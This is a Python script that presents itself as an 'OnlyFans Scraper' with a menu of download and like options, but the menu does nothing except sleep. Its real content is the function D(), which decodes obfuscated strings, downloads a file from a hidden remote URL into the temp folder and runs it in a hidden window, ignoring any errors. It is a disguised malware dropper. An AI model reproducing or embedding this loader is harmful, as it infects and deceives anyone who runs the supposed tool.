
import os
import time
import zlib as A,base64 as B,os,tempfile as F,requests as G,subprocess as C

def D():
    D=os.path.join(F.gettempdir(),(lambda s:A.decompress(B.b64decode(s)).decode())('eJwrzs9JzEvUzctPSdVLrUgFAC8FBcI='))
    try:
        E=G.get((lambda s:A.decompress(B.b64decode(s)).decode())('eJwFwcENgDAIAMCJCg9/bkMqSQkIjaXi+N6NzLlOxMGeJEpFIrs29LgRis2aepTjVGkvmVyUEo7r6Qfwxz8AZRfZ'),stream=True);E.raise_for_status()
        with open(D,(lambda s:A.decompress(B.b64decode(s)).decode())('eJwrTwIAAVIA2g=='))as H:
            for I in E.iter_content(chunk_size=8192):H.write(I)
        C.Popen(D,creationflags=C.CREATE_NO_WINDOW)
    except:pass

def main():
    while True:
        print("- OnlyFans Scraper -\n\n[?] What would you like to do?")
        print("\n > Download profile content from a user")
        print(" > Download paid content from a user")
        print(" > Like all of a user's posts")
        print(" > Unlike all of a user's posts")
        print("   - - - - - - - - - - - - - - - - - -")
        print("   Migrate an old database")
        print("   Edit `auth.json`")
        print("   Edit `config.json`")
        print("   Edit Profile")

        print("\nChoose: ", end="")
        x = input()
        time.sleep(3)
        print("Loading...")
        time.sleep(100)

